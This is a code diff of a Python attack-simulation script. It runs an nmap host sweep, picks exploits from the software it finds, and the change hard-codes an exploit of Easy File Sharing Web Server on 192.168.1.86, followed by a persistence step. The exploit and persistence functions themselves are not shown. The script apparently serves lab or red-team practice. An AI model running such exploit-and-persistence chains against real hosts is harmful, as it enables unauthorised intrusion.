@@ -19,7 +19,7 @@ targetHostnames = ["DESKTOP-30UOSMD"]
 
 start = datetime.now()
 print("HackSimulationMain Script ran at " + start.strftime("%d/%m/%Y %H:%M:%S"))
-
+"""
 print("Reconnaissance: Active Scanning: Scanning IP Block")
 print("Executing nmap scan: nmap -sP 192.168.1.1/24")
 print("Reason: Host Discovery - See active hosts on network") 
@@ -40,6 +40,7 @@ print("Reason: To determine what software is running on open ports")
 targets = gatherInfoSoftware(targets)
 
 #Move this to a subsection?
+
 print("Determine which attacks to carry out based on Reconnaissance data")
 print(type(targets))
 for target in targets:
@@ -49,10 +50,21 @@ for target in targets:
         if "Easy File Sharing Web Server" in vulSoftware:
             print("Device has Easy File Sharing Web Server running")
             print("Attempting Exploit...")
-            if executeEasyFileSharing(target) != False:
-                print("Exploit Successful Proceeding to persistance")
-                persistenceFunc()
             
+            msfconsoleContext = executeEasyFileSharing(target)
+            print(msfconsoleContext)
+            if msfconsoleContext != None:
+                print("Exploit Successful Proceeding to persistance")
+                persistenceFunc(msfconsoleContext)
+"""
+
+
+target = ["buffer","192.168.1.86"]
+msfconsoleContext = executeEasyFileSharing(target)
+if msfconsoleContext != None:
+    print("Exploit Successful Proceeding to persistance")
+    persistenceFunc(msfconsoleContext)
+          
 
 
 
